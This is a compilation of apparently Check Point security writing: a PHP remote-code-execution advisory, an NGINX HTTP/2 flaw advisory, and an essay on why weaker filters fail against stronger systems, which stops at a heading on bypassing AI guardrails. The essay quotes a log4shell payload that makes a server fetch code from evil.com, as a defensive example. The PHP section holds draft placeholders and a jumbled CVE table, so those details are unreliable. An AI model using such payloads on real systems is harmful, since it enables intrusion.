Title: New PHP Vulnerabilities: What Organizations Need to Know and How Check Point Customers Are Protected
Context: CVE-2026-129289: the risk CVE-2026-129289 is a critical PHP vulnerability that lets an attacker smuggle a malicious request inside a malformed HTTP request
Full Text:
On November 19, 2026, A series of recently disclosed vulnerabilities in PHP has put one of the world’s most widely deployed web technologies under renewed scrutiny.

The most significant issues, CVE-2026-109618 and CVE-2026-109619, are critical remote code execution vulnerabilities that can allow an unauthenticated attacker to execute code on vulnerable PHP systems. CVE-2026-109618 carries a CVSS 4.0 score of 9.2 and has since been added to the CISA Known Exploited Vulnerabilities catalog.

A third issue, CVE-2026-115560, was disclosed shortly afterward. It involves a more specific PHP configuration and should be considered separately from the two original PHP2Shell vulnerabilities. Public reporting indicates PHP recommended temporarily disabling session upload progress for the affected configuration while awaiting the regular fix.

It lands just four weeks after PHP2Shell (CVE-2026-109618 and CVE-2026-109619), which attackers began exploiting within hours of disclosure. No exploitation of the new flaws has been reported so far. Given how fast PHP2Shell went from patch to attack, we don’t expect that window to stay open for long.

Check Point customers remain protected

Check Point has released IPS protections against attempts to exploit these PHP remote code execution vulnerabilities. Customers should ensure that their Security Gateways are running the latest IPS update and that the relevant protections are enabled in Prevent mode.

Check Point;s PHP Remote Code Execution advisories : CPAI-2026-15172 CPAI-2026-15184 covers CVE-2026-109618, CVE-2026-109619 and CVE-2026-115560 and is rated Critical.

CVE-2026-129289: the risk

CVE-2026-129289 is a critical PHP vulnerability that lets an attacker smuggle a malicious request inside a malformed HTTP request. This can bypass server access controls and lead to remote code execution.

How Check Point protects against it

Check Point Gateways prevent this attack by dropping non-compliant HTTP traffic. For full protection:

Make sure the Non Compliant HTTP inspection setting is activated and installed with the Access policy.

For HTTPS traffic, also enable HTTPS Inspection.

(Add here)

Importantly, IPS protection provides an additional layer of defense, but it does not replace updating PHP itself. Organizations should patch vulnerable installations as quickly as possible.

Here is what we know by now, who is exposed, and what to do about it.

What do we know by now

All seven critical flaws carry a CVSS 4.0 score of 9.2, and every one of them depends on specific configuration or runtime conditions. Several can lead to remote code execution (RCE).

CVE

Component

Branches

What has to be true

CVE-2026-129289

PHP-FPM request smuggling

8.2–8.5

The web server reuses FastCGI connections, and the app opens php://input without reading it fully. Can lead to unauthenticated code execution.

CVE-2026-115560

Session upload progress is on and session data is read with mismatched serializers. Left open by the October PHP2Shell fixes.

8.2–8.5

An interrupted session write plus attacker influence over session data.

CVE-2026-129496

A startup warning is logged (for example, an invalid date.timezone), then an early request warning hits a fresh worker.

Furthermore:

This is PHP2Shell’s unfinished business. CVE-2026-115560 was left open by the October patches, and CVE-2026-129182 and CVE-2026-129481 extend the fixes for CVE-2026-109619.

Session upload progress is now off by default. This is the feature PHP2Shell abused. Servers that set it explicitly keep it on.

A local path to root. CVE-2026-129291 (high) lets an attacker who can run code in a PHP-FPM worker execute commands with the FPM master’s privileges, which is often root.

The release also fixes bugs in PHP-CGI, PHAR signature checks, SOAP and the HTTP stream wrapper. Full technical advisories are published on the PHP project’s GitHub.

Who’s exposed

Any server running PHP 8.2 through 8.5 below the fixed versions is affected. Whether a given flaw is reachable depends on how PHP is deployed. The setups at highest risk:

PHP-FPM behind connection-reusing front ends. Nginx with fastcgi_keep_conn on, or Apache mod_proxy_fcgi with enablereuse=on (CVE-2026-129289). Reuse is off by default in both, so check custom configs and includes.

Apps that keep session upload progress on and mix serializers (CVE-2026-115560), for example code that switches session.serialize_handler at runtime.

PHP 8.5 deployments not using the production php.ini template, where zend.exception_ignore_args is left at 0 (CVE-2026-129474).

Shared hosting and multi-tenant FPM pools, where one tenant’s code could escalate to the FPM master’s privileges (CVE-2026-129291).

php-cgi with particular web server path mappings (CVE-2026-129538).

Two groups are easy to miss:

End-of-life PHP. PHP 8.1, 8.0 and 7.4 get no official release. The PHP security team published minimal source backports, and some vendors are shipping their own. PHP 8.2 itself reaches end of life on December 31, 2026.

PHP you didn’t install. Vendor products, appliances, admin portals and container base images often bundle their own PHP runtime. PHP2Shell showed that attackers go after exactly these edge-facing systems.

Organizations should look for PHP across:

Internet-facing websites and web applications

WordPress, Drupal, Joomla, Magento and other PHP-based environments

PHP-FPM and Apache/mod_php deployments

Shared hosting infrastructure

Containers and cloud workloads

Hosting and administration platforms

Commercial applications and appliances that bundle PHP

Legacy systems running unsupported versions of PHP

What needs to be done

Upgrade PHP to 8.5.13, 8.4.28, 8.3.37 or 8.2.36. Linux distributions often backport fixes without changing the version number, so check the package changelog for the CVE IDs instead of relying on php -v.

If you can’t patch today, apply the interim mitigations:

Disable session upload progress: set session.upload_progress.enabled=0 in php.ini or the FPM pool config. It can’t be changed with ini_set(). Restart all workers and verify the value through the web server, not the CLI. Uploads still work; only server-side progress bars stop.

Turn off FastCGI connection reuse (fastcgi_keep_conn in Nginx, enablereuse in Apache).

Disable catch_workers_output in PHP-FPM pools.

On PHP 8.5, set zend.exception_ignore_args=1.

For end-of-life PHP, apply your vendor’s backported fixes or the PHP security team’s source backports, and schedule the migration.

What should organizations do

Find every PHP instance

Inventory PHP across the environment.

Start with internet-facing systems, but include containers, cloud workloads, third-party products, appliances and applications that may bundle PHP internally.

Organizations using external hosting providers should also confirm which PHP version the provider is actually running.

Patch PHP, not just the application

Move supported PHP branches to their appropriate fixed releases.

Do not assume that updating WordPress, Drupal, Magento or another CMS resolves the issue. The underlying PHP runtime must be addressed.

After updating, restart PHP-FPM, Apache or the relevant web service and verify that the patched PHP version is actually running.

Treat unsupported PHP as a priority

Older versions create a different remediation challenge.

PHP’s current lifecycle information shows that PHP 8.1 and earlier are end-of-life. See PHP’s official branch status. [php.net]

For those systems, administrators should check whether their Linux distribution or commercial vendor provides a maintained backport. Where that isn’t possible, migration or isolation should be prioritized.

Reduce exposure where immediate patching isn’t possible

Where vulnerable systems cannot immediately be updated:

Restrict internet access.

Apply access controls where possible.

Segment affected web servers from sensitive internal systems.

Limit unnecessary outbound connectivity.

Consider temporarily taking particularly exposed systems offline.

These measures reduce risk, but they are not substitutes for applying the appropriate PHP security update.

Make sure preventive protections are enabled

Check Point customers should update IPS and verify that the PHP Remote Code Execution protections are active.

The Check Point advisory provides the applicable protection and configuration guidance for Security Gateway customers. Check Point PHP Remote Code Execution protection. [advisories…kpoint.com]

This follows CPR’s earlier operational guidance to keep critical IPS protections updated and use Prevent mode after appropriate validation. [COMMS week…y catch up | Teams]

Don’t stop at patching. Look backward.

Patching closes the vulnerability, but it does not determine whether the system was compromised before it was patched.

That consideration is particularly important now that CVE-2026-109618 appears in CISA’s Known Exploited Vulnerabilities catalog. See the NVD/CISA status. [nvd.nist.gov]

Security teams should therefore investigate vulnerable or previously vulnerable systems for indicators such as:

Web server or PHP processes unexpectedly spawning shells

New or unfamiliar PHP files appearing in web roots

Unexpected outbound connections from web servers

Unusual HTTP requests to PHP endpoints

PHP worker crashes or unexplained service restarts

These behaviors are consistent with the hunting guidance developed in CPR’s PHP2Shell_Threat_Report_CVE-2026-109618_109619. [PHP2Shell_…618_109619 | PDF]

How Check Point protects customers

Check Point has released IPS protections covering both CVE-2026-109618 CVE-2026-109619 Customers with IPS enabled on Check Point Security Gateways are protected.

Stay up to date with the Vulnerability Response Point

When critical vulnerabilities hit, head to the Check Point Vulnerability Response Point for live research as events unfold. It helps you understand:

What’s at risk

What to patch

How to stay protected

Check Point Research continues to monitor for exploitation and will update this post as more becomes known.

Title: Two Critical NGINX HTTP/2 Flaws: What to Patch First
Context: Threat intelligence adds context on whether exploit code is public or attacks are underway, so you can rank a flaw like this against everything else on your list
Full Text:
The web server in front of your applications can now be taken over by someone with no login and no help from your own code. Two critical NGINX flaws, CVE-2026-123007 and CVE-2026-123633, make that possible when HTTP/2 is on. F5 and the NGINX project released fixes on November 18, 2026.

Our research team published a full advisory on the NGINX HTTP/2 flaws with version tables, mitigations, and hunting guidance.

Check Point WAF SaaS, Not Vulnerable – Our R&D team assessed these critical NGINX vulnerabilities and found that Check Point WAF as a Service (SaaS) is not vulnerable to them. The way the platform is built and configured doesn’t enable the conditions an attacker would need to exploit them. No customer action is required.

What the flaws do

HTTP/2 lets many requests, called streams, share one connection. NGINX tracks how much data it may send on that connection with a flow-control counter. CVE-2026-123007 breaks that accounting: a canceled stream’s refund pushes the counter past its limit, a later check wraps around, and an invalid length becomes an out-of-bounds memory copy.

The bug has been in NGINX since version 1.9.5, so it covers every release since HTTP/2 support arrived in 2015. Researchers ran code on a server that only served static files, with no backend application and no third-party modules.

CVE-2026-123633 is a use-after-free in connection handling. When NGINX acts as a reverse proxy and runs low on connection slots, it frees a busy connection mid-request and keeps using the memory. It affects NGINX from version 1.19.7.

How CVE-2026-123007 moves from an HTTP/2 session to code execution, with a summary of both flaws

F5 rates both flaws 9.2 on CVSS v4.0. Neither needs authentication. An attacker only has to open an HTTP/2 connection.

Why the front door is key

NGINX typically terminates HTTPS and routes requests to the applications and APIs behind it. One compromised server can expose the traffic, credentials, and secrets for every site it fronts. Failed attempts crash workers, which gives your team a signal to watch.

Researchers also chained a separate, unpatched Linux SCTP flaw to reach root and escape a container. Blocking the SCTP kernel module where you don’t need it closes that path until a kernel fix ships.

Where exploitation stands

A public proof-of-concept exploit exists for CVE-2026-123007, and national CERTs in Japan, Poland, and France issued alerts. As of November 18, 2026, there are no confirmed attacks in the wild, and neither CVE is in the CISA Known Exploited Vulnerabilities catalog.

The public exploit needs about 128 GB of HTTP/2 traffic on one connection and an AVX-512 processor, and it likely fails through a proxy. That slows mass attacks. Targeted attacks face a lower bar.

Three common controls will not carry you here. Researchers defeated ASLR by leaking memory first, WAF rules don’t inspect the HTTP/2 control frames involved, and access logs don’t record them.

Key numbers from the advisory, as of November 18, 2026.

Find your NGINX first

A server is exposed when three things are true: it runs an affected version, it accepts HTTP/2, and an attacker can reach it. Affected versions are NGINX Open Source 1.9.5 to 1.30.6 and 1.31.0 to 1.31.8, plus NGINX Plus 37.x before the fixed builds and NGINX Plus R34 to R36, which get no fix.

Check the version and configuration on the server, then confirm from outside whether it offers HTTP/2. If the second command prints ALPN protocol: h2, HTTP/2 is on.

nginx -v; grep -rnwE 'http2' /etc/nginx/

openssl s_client -connect <host>:443 -alpn h2 </dev/null 2>/dev/null | grep ALPN

Don’t close a finding on the version string alone. Linux distributions often backport fixes without changing the version number, and Ubuntu and Red Hat fixes were still pending on November 18. NGINX inside appliances, ingress controllers, and container images isn’t fixed by operating system updates. The retired Kubernetes ingress-nginx project won’t ship a fix for CVE-2026-123633, so plan a move to a maintained controller.

Where NGINX runs beyond a dedicated web server, and what to do in each case

What to do now

Inventory every NGINX instance, including container images, ingress controllers, load balancers, appliances, and origin servers behind your CDN.

Run the external HTTP/2 check on each internet-facing host and put servers that offer HTTP/2 at the top of the list.

Upgrade internet-facing servers to NGINX 1.30.7 or 1.31.9, or NGINX Plus 37.0.8.1 or 37.3.0.1.

Turn off HTTP/2 on listeners that must wait for a fix. gRPC needs HTTP/2 and breaks without it, so patch those services instead.

Restart NGINX after upgrading, because a reload keeps the old binary. Rebuild container images, then rerun the checks to confirm.

Then hunt for signs of earlier attempts: repeated worker crashes in the error log, NGINX workers starting shells or opening new outbound connections, unusually large and long-lived HTTP/2 sessions, and floods of WINDOW_UPDATE or RST_STREAM frames. None of these proves a compromise, and their absence doesn’t prove a server is safe.

The same release fixes three more critical flaws in the DNS resolver, HTTP/3, and the mail proxy. Turning off HTTP/2 doesn’t block them, so upgrading is the complete fix. Internal servers count too, since an attacker with a foothold in your network can use these flaws to move laterally.

What this means for Check Point WAF customers

Check Point R&D has assessed all five critical NGINX vulnerabilities disclosed in November 2026: CVE-2026-123007, CVE-2026-123633, CVE-2026-123634, CVE-2026-121810, and CVE-2026-113425.

WAF SaaS and WAF Agent Docker deployments (standalone)

Check Point WAF SaaS is not vulnerable to these five vulnerabilities, and neither are Check Point WAF Agent Docker images deployed with Check Point’s default configurations. In both cases, the configuration doesn’t enable the conditions required for exploitation:

HTTP/2 flaws (CVE-2026-123007, CVE-2026-123633): HTTP/2 is disabled on the WAF application listeners.

Resolver flaw (CVE-2026-123634): The standard WAF SaaS configuration and the default WAF Agent configuration don’t enable SSI or mirror subrequests.

HTTP/3 flaw (CVE-2026-121810): HTTP/3 and QUIC aren’t enabled.

Mail proxy flaw (CVE-2026-113425): Neither WAF SaaS nor WAF Agent uses NGINX mail proxy functionality.

WAF SaaS customers aren’t exposed to these five vulnerabilities through the assessed deployment configuration, and no customer action is required.

WAF Agent virtual machine deployments (IaaS)

For WAF Agent deployments that use Check Point-provided VM images, the assessment looks at the deployment architecture and the components handling incoming traffic:

Behind a cloud-managed load balancer (default and recommended): Check Point recommends deploying WAF Agent VMs behind cloud-managed Application Load Balancers (ALBs). Follow your cloud provider’s security advisories and remediation guidance for the managed load balancer infrastructure.

Without a load balancer: Check Point WAF Agent blocks all currently observed exploitation attempts associated with these five vulnerabilities, including where the VM is directly exposed. Check Point still recommends upgrading to the latest WAF Agent version available in the Check Point Portal, which incorporates the official NGINX security fixes.

Behind a customer-managed NGINX front end: If you run a separate NGINX reverse proxy in front of your WAF VMs, assess its version and configuration against the published CVEs and apply the relevant security updates where required.

Updated WAF Agent images for Docker and VM deployments

As an additional security measure, Check Point is preparing updated WAF Agent Docker and VM images based on NGINX version 1.30.7, with the latest official security fixes. Once the updated images are released:

Automatic upgrade enabled: You’ll receive the NGINX security update through the automatic upgrade process, with no manual intervention.

Automatic upgrade disabled: You must upgrade to the latest Check Point WAF Agent version as soon as it’s available.

Check Point strongly recommends keeping automatic upgrades enabled, so security fixes and product updates are deployed on time. You can upgrade your WAF Agent to the latest available version through the Check Point Portal. For details, see the WAF Agent upgrade instructions.

Check Point continues to monitor emerging security vulnerabilities and validate its protection capabilities to maintain the security and resilience of its WAF SaaS platform.

Closing the gap between advisory and action

An advisory gives you a list of affected versions. Your team still has to find where those versions run, which ones an attacker can reach, and which to fix first. That work takes time when NGINX sits in appliances, containers, and servers that nobody has looked at in years.

Exposure management shortens that path. Check Point Exposure Management brings together asset discovery, attack surface management, threat intelligence, prioritization, validation, and remediation guidance in one workflow. It shows where affected software runs across your internet-facing and internal assets, including servers outside your inventory.

Threat intelligence adds context on whether exploit code is public or attacks are underway, so you can rank a flaw like this against everything else on your list. Validation confirms whether an exposure is exploitable in your environment. Remediation guidance then helps your team fix issues in order of risk, with 160+ integrations and a 20-minute agentless setup.

Title: 30 Years of Gatekeeper Asymmetry Doom: The Paradox that Makes Powerful LLMs More Vulnerable
Context: Detection models gradually advanced and became more powerful: first an ineffectual shrug, then calculating the domain entropy to catch xrewrgfuvhnadfsajkaldsfj
Full Text:
Abstract

We give an exposition for a principle of gatekeeper asymmetry doom in information security, which states that “If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.” We list a variety of examples where one can see this principle in action, including the limits of static binary classification, the proliferation of sandbox evasions and our own ‘PuzzleMask’ research for bypassing external AI guardrails, as well as a short exposition of how the Time Hierarchy Theorem also exemplifies this same principle. We conclude with a recommendation that “doomed” attack surfaces should be noticed and the gap be narrowed down as much as possible, by upgrading gatekeeper power or making use of its existing power more comprehensively. We note that frontier LLMs (with scaffolding, extended reasoning, code execution in the chain of thought, and so on) have significant power in this sense and can meaningfully contribute to narrowing “doom” gaps, though ultimately, they themselves are still subject to this principle.

Introduction

In the same spirit of Moxie Marlinspike’s Cryptographic Doom Principle [1], the Gatekeeper Asymmetry Doom principle states that:

If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.

By the mention of ‘leveraging a hard problem’ we mean to exclude e.g. signature verification for binary files, which is many times simpler than executing the file but can still, at least in a certain theoretical world, determine whether the binary is malicious or not. The principle might be phrased more glibly as “every quick sanity check involves either cryptography or a silent prayer.”

From now on, rather than writing out “gatekeeper asymmetry doom” every time, we will simply refer to “doom” for short. We’ll start with examples that are more on the “warm-up” side and gradually go from those to less intuitive ones where the application of the principle is more surprising.

Examples

Hash Comparison

A good warm-up example to start with is the one burned into the psyche of every infosec practitioner in some fundamental post-traumatic sense.

At some point during the 1990s, the silent thought must have come to someone in the industry that malware was solved. You could collect all the hashes of malicious binaries in a large database and then a gatekeeper, called in this case an “antivirus,” would check each executed binary against the known list of ‘bad’ hashes. Of course, new threats would emerge periodically, and the list would have to be updated, but this was a caveat – not a dealbreaker.

The gap between the gatekeeper’s power and the target’s power here was truly huge. The target in this case is the full Turing-complete execution of a binary, and the gatekeeper is a simple observation of whether the binary is in some set of known files. The procedure effectively strips all other file data and precludes it from consideration, and the threat actors’ counter was infamous and trivial: for each compiled binary, randomize the value of some non-load-bearing byte. This is more a precursor to Gatekeeper Asymmetry than the proper thing itself: what’s doing the work in motivating hash comparisons is less a notion that the file has been ‘analyzed’ in some way, and more a bundle of implicit assumptions regarding where, how and when malicious binaries come into being. Still, there is a straight line connecting the initial concept of hash comparison and the rest of the fraught journey of attempting to classify binaries by static analysis alone.

Pattern Matching

Since the days of the simple hash comparison, the gatekeeping models for static analysis have grown more complex and powerful. Perhaps the natural instrument to mention here is the use of pattern matching and regular expressions. This is the paradigm underlying YARA rules, and it acts as a backbone of the binary classification process still to this day. The effectiveness of this sort of signature varies with the skill and insight of the author; but in the spirit of this piece, let us assume a maximally skilled author, writing the best possible pattern-based signatures. One can imagine this would involve fingerprinting the most characteristic assembly instruction sequences and implementing some kind of system that expertly delineates how many fingerprints and of what kind are required in order to tip the scales and declare a positive verdict.

Let us game out what happens if this defender-optimistic utopia becomes the norm: signatures of the above-described level for every piece of malware to emerge from now on, within some reasonable time frame that continuously shrinks due to automation. As an aside, we’re not quite there yet; as of 2026, AI-augmented YARA rule generation has already improved the throughput of signature authorship considerably, though coverage and consistency are not close to this utopia. The “Code Similarity” approach operates in a related but distinct paradigm, matching binary fragments against a known corpus rather than producing pattern-based signatures per se; but we can imagine a super-charged version of it with an all-encompassing database. If tools of this kind are fully brought to bear, threat actors would face difficulty as the characteristic subroutines of every malicious binary become a reputational hazard. But eventually, Gatekeeper Asymmetry wins. By this we mean that regular expressions have well-known and theoretically understood limitations: similarly to how they are not powerful enough to parse HTML, they are also not powerful enough to capture the class of assembly subroutines that perform some action, or the class of assembly subroutines that perform some action using some specific algorithm, or even the class of assembly subroutines that perform some action as implemented by some specific sequence of instructions that have been subject to moderate mutation. The above-described hypothetical ‘utopia’ would therefore be temporary, and the projected end state would be some malware generation process that takes care to inject this moderate mutation into every subroutine: a new kind of polymorphism.

Static Reverse Engineering

This method of classification, also known as ‘reading the disassembly’, is considered the apex form of static analysis. To discuss how Gatekeeper Asymmetry still applies even when this tier of analysis is brought to bear, first we need to define the dividing line between static and dynamic analysis. After all, theoretically, one might conjure the image of some savant reverse engineer thoughtfully reading through the binary and losslessly executing the code as-is, obfuscations and all, inside of their head. If we make the mistake of taking this image seriously, somehow static reverse engineering has now become equivalent to sandbox analysis.

Of course, that idea is patently absurd in practice. Even novice reverse engineers know that humans should only attempt it sparsely, to tease out the function of a specific assembly snippet or a reasonable function. The barrier to dynamic-equivalent static analysis is not just about ambition or raw intelligence — even frontier LLMs have historically struggled with this task [2][3], and in the worst case they still do. While our concern here is not reaching some exact definition of where static analysis ends and dynamic analysis begins, we can lean on the common wisdom that there is in fact such a line, or at least such a spectrum; and we can broadly gesture that this spectrum has something to do with the direct application of RAM and gigaflops to binary input in a certain way.

With that understanding in place, the power gap shifts into focus: the target (victim machine) can run the malicious binary, but the gatekeeper (human, LLM) cannot — not natively, anyway. Through this capability gap came a litany of concepts reverse engineers know well, and wish they didn’t: packers, opaque predicates, control flow flattening, the movfuscator, the Rust Programming Language. As LLMs grew more powerful this gap has gradually shrunk, but basic computability theory tells us it can’t disappear outright. If we again consider the ‘utopia’ for this specific gatekeeping model, it would be a world where an (at least) human-expert-level LLM statically analyzes every new binary encountered in the wild. By now we’re really not so far off from that world as we used to be, so let us ask: assuming we get there, what’s the new equilibrium? The answer, again, lives in the gap created by Gatekeeper Asymmetry. Binaries universally obfuscated to such a degree that a debugger is strongly required to tease out their functionality, or even worse.

Relatedly, consider the SolarWinds compromised update [4], [5], which unabashedly attempted to brainwash anyone reading its source code into compliance with the idea that they are looking at benign software, and nothing is wrong here. While mitigations exist for this technique (in both LLMs and humans), it is representative of the general shape of the Gatekeeper Asymmetry that emerges here: technical levels of obfuscation and misdirection that make the current state of the art seem half-hearted in comparison. While malware has traditionally had the property of not wanting to be read, we do not quite yet live in a world where selection pressures have pushed it to either adopt bleeding edge obfuscation or perish. We can see the shape of this possible world post-equilibrium, and find little to like about it: one where we miss the old days when we could ‘unpack’ binaries to make code readable; where our favorite disassembler stops being a tool of analysis and becomes the vessel of a futile hope; and where an LLM being told “reverse engineer this binary” ends up being forced to reinvent the sandbox from first principles.

Interlude: What Gatekeeper Asymmetry Doom is Not

There exists an unfortunate genre of technical opinion piece where a vacuous theory-of-everything is put forward, followed by a just-so explanation of how every single thing that has ever happened is explained by that theory. So, in the spirit of healthy skepticism, let us cherry-pick some disastrous phenomena in information security that have absolutely nothing to do with Gatekeeper Asymmetry Doom.

Fuzzing being viable as a vulnerability discovery strategy. In this context there is typically no “Gatekeeper” standing between adversarial input and the target application.

The possibility of supply chain attacks. Gatekeepers by definition exist to vet untrusted input. If you are facing trusted adversarial input, then that is very bad, but out of scope for this discussion.

The lagging race for automatic detection of fast flux domains. Detection models gradually advanced and became more powerful: first an ineffectual shrug, then calculating the domain entropy to catch xrewrgfuvhnadfsajkaldsfj.biz, then n-gram frequency engines, then weird “edit distance to the dictionary” hacks [6] to catch Kwyjibo [7]. Attackers evolved to use concatenations of randomly generated dictionary words [8], [9], and defenders could have responded with some tool that considers semantic space to verify whether domains ‘parse’, and nowadays would probably respond with an LLM if the problem really mattered to them. At any rate, while the “Gatekeeper” has evolved, the “Target” is a DNS server which has no ‘power’ in any meaningful sense. It just associates domains with responses and IP addresses. It’s not processing the domain names using any sort of complex logic.

Now, let’s go back to investigating security failures that are the result of asymmetry doom.

Futility of Deny Lists

In this context, a “Deny List” means a list of forbidden inputs, or sequences that inputs are forbidden to contain. Such lists are usually assembled in an attempt to block a class of problematic inputs, and by now they have made a reputation for themselves as a stop-gap measure destined for eventual failure. We feel this is a good spot to quote at length from our own First Introduction to System Exploitation [10] (this is a rather watered-down version fit for the current format):

Suppose we manage a chatroom and, as [..] Digimon fans, we refuse to allow anyone in the chatroom to mention [anything to do with] the Pokémon franchise. We download a list of Pokémon and feed it to an automatic script running on the chat server; the script scans every incoming message and simply removes the offending phrase before displaying the original message. So, if someone says: Three weeks ago I went to see the movie 'Detective Pikachu', this will show up as Three weeks ago I went to see the movie 'Detective '. [..]Someone posts gengar uncapitalized and it gets through, so we fix our filtering to be case insensitive. Two French people manage to have a hearty conversation about who’s cooler, Dracaufeu or Tortank, so we add support for foreign languages.Everything goes well until one day someone posts [a message concerning the Pokémon Victini]. [Our list] doesn’t include Victini; it’s a new one [..] Begrudgingly, we set up a script that scrapes the Bulbapedia database for new characters, Pokémon, and other terms of art. [..]At this point people catch on to what we are doing and start expressing their displeasure by explicitly wording their messages to get around our system. They start speaking of J*gglypuff and 4lakazam and Mew_two. We [..] implement a system that checks input for character similarities and word similarities to [blocked words]. Eventually [the filter censors someone’s actual username for incidentally being a well-known Pokémon character] and a great outcry pours forth from the community, decrying our [blanket blocking policy] [..]As we mull this over, to our horror, the next day [a user appears to be posting messages containing pikachu, pokeball, etc. with impunity]. We ban this person, but more people keep coming in and doing it. We double check that these terms do appear in our filter, and when done, we have no other choice but to reach for the server logs and find out [the original, unsanitized messages were pikapikachuchu, pokepokeballball, etc]. Our filter only performs one pass on the input. It removed the embedded offending terms, only to leave new offending terms in their wake: once pikachu was removed, pikapikachuchu became simply pikachu. We sigh and implement an iterative engine that runs the script again and again until no offending terms are left.This works for two weeks, and then the pikachus start appearing in chat again. After much toil and investigation, we find out that the open-source chat engine we’ve been using has support for some arcane server-side language called CHATSCRIPT, and people have been sending in CHATSCRIPT<"pika"+"chu">…

This issue is very basic in its nature and excessively well-known, and yet its specter still haunts defensive postures in the current era. For an example, look no further than the 2021 log4shell debacle [11], [12]. If you try to recall what a log4shell exploit actually looks like, in all probability you’ll come up with ${jndi:ldap://evil.com/malware}. Easy fodder for a deny list, except there were equally-as-valid exploits floating in the wild that looked like this [13]:

Figure 1: Obfuscated log4shell exploit.

Gatekeeper asymmetry applies here rather acutely. Gatekeeper power is just a list of words, and even if we grant an upgrade to regular expressions / YARA rules, the situation does not improve by much — either for the Pokémon parable or for the log4shell example where a gatekeeper might have attempted to block strings containing jndi:ldap. The target the list is attempting to protect may vary, but almost by definition, the target has more power in its capacity as a model than the implicit is_substring_in_dict the list enforces, and the same goes for the regex analogue most of the time. At least one can imagine a feasible situation where the attack surface has the shape of a regular expression, but with a strict deny list of simple strings, it’s hard to think of even that.

Sandbox Evasions

If there ever was a defensive instrument built with doom in mind, sandboxes are it. They can flag malicious binaries with no regard for degree of obfuscation, which demonstrates that once you close some capability gap, some corresponding doom is averted. Alas, doom comes for them as well: every discrepancy where a Sandbox is not quite so capable as a real victim machine seems to give rise to a sandbox evasion, with almost mathematical certainty [14], [15].

We are genuinely wary to list some of the examples, and would prefer not to call up that which we cannot put down. There are some relevant notions here that were mentioned in someone’s alarming slide show once at a 2021 conference, then mercifully never spoken of again. Still, some evasions of this type have become common knowledge, and have proliferated in the landscape to a degree where we feel comfortable naming them.

One particular example of this is sandbox evasions based on user mouse movement. In our own research, The Cat and Mouse Game [16], we developed a sandbox evasion that, at the time, evaded every state-of-the-art sandbox we threw it at while reliably triggering a latent payload upon human-generated mouse movement. Every researcher intimately knows the ‘blood in the water’ moment where they realize that a result is there for the taking, and the rest is algebra. Here, we were motivated by noticing doom. The fact that actual victim machines have ‘access’ to a human operating the mouse and keyboard, and sandboxes do not, was enough to conclude that an evasion almost surely must exist. In the article’s own words:

Observing the way many evasions work as seen in (e.g.) the al-khaser test suite and taking it at face value can lead to a mistaken mental model where ‘evasions’ must result from simple glitches that can be fixed, or otherwise from naive responses by the sandbox to a query about something: some file, some registry key [..] One might complacently reason that sandboxes simply need to ‘fix all the glitches and patch all the query results’, and that sandbox hardening is in this way reduced to going through a gigantic check list and is effectively a solved problem. Unfortunately, this approach falls apart in cases where satisfying the query requires, in a strong sense, some intrinsic resource that the sandbox does not have access to.

Figure 2: The above-mentioned research uses several sources of sinusoidal noise to generate random mouse movement. This is the mitigation; we never published the evasion itself.

That article’s parting words include an ominous thinly veiled apology:

The theoretical ceiling for the sophistication of evasions and counter-evasions in this space is very high. To intuitively understand this, consider that if a human tries to decide whether the mouse movement in the above animation is simulated or human-generated, there’s a decent chance they would answer correctly. But it won’t be so straightforward to properly motivate this answer or explain the considerations involved to a Python script. [..]These sorts of games favor incremental improvement by their nature. There are many detections, mitigations, plays, and counter-plays [..] It’s great to think about the holy grail of perfect solutions, but it’s often more practical to raise the bar and make attacks more of a hassle than before.

In this context we can be less coy and outright say what this is an apology for: an average of random sine waves is not comparable to an actual human at the sandbox. Gatekeeper asymmetry still applies, an evasion must inevitably exist that defeats our fancy algorithm. The ladder of evasions and counter-evasions proceeds upwards, until the hypothetical limit point of some model that is powerful enough to generate and detect human-like movement, such that no model can realistically detect its generated output or generate output it cannot detect. Just to frustrate the minority of attackers who cannot figure out what we are talking about, we won’t name this ‘apex intervention’ here outright; but for the majority of defenders, if someone ever actually crafts an evasion that abuses anomalies in the output of the above algorithm (or of the comparable algorithms introduced since then to e.g. Capev2), you ought to know what to do next.

“Please Enable Macros”

We should start at the end: on February 7, 2022, Microsoft righteously dropped the hammer [17], [18] on this ridiculous meme of an intrusion vector. Users could no longer just click ‘enable content’ on a yellow ribbon, manipulated into believing it was a legitimate action they had to take because “the document is view-protected” or “MS-Word encountered an error.” This was an unquestionably good thing, and a small proof that the arc of the moral universe does indeed bend towards justice.

But, before we reached that conclusion, a whole ecosystem of malicious documents had proliferated for a decade. And, inside that ecosystem, a strange cold war was taking place between defenders and attackers – a war that hinged on one load-bearing gap: that the human visual cortex was better at extracting text from adversarial images than the OCR technology of the time.

We (and, we have to assume, other security vendors) began to discretely flag documents with any image that contained the text “please enable macros” or “please enable editing”:

[..] Since early 2015, Check Point Research has conducted the OSEF project (Office Social Engineering Finder) to automatically collect, catalog and block the increasing deluge of these documents. [..] In total we came across hundreds of thousands of malicious documents, mostly downloaders for the Emotet malware, many of which had 0 detections at VirusTotal at the time of discovery.

OCR libraries, here in their capacity as the gatekeeper, had less power than the human targets parsing the images. Enter, inevitably, doom. Threat actors began to include images containing adversarial noise invisible to the human eye, meant to confuse and aggrieve then-SOTA OCR libraries such as tesseract.

Figure 3: Innocent-seeming image merely making a reasonable request.

Figure 4: Tesseract OCR output on the above image.

To counter this, we began to pre-process incoming images – converting to grayscale, applying threshold effects, and so on. We also allowed some “fudge factor” in the input so that a slightly mis-parsed “enable adiling” would still match. Jointly, these two measures caused significant improvement in the detection rate. We were amused to note that to make the attack work while bypassing our scrutiny, attackers found themselves trying to create an image that humans could parse successfully, but automated algorithms could not – in other words, a CAPTCHA. At the time, we had hitched our hopes to human incredulity to carry the day and bridge the gap, envisioning that eventually the attackers would be cornered into the SOTA end state as of that time:

Figure 5: An imagined “Enable Editing” lure with full-fledged CAPTCHA. Surely, no human would comply with that…

Sadly, or happily, this future never had a chance to materialize.

Fittingly for a story about a cold war, this research was presented at Positive Hack Days 2019 in Moscow, back during happier times. We cannot entirely rule out the possibility that a malware author was sitting in the audience and taking notes, but we’d ruled in favor of sharing it anyway because by that point, judging by the sheer volume of subtly garbled images flooding our feeds, anyone savvy enough to catch that hint had already caught it long ago.

PuzzleMask Bypass for AI Guardrails

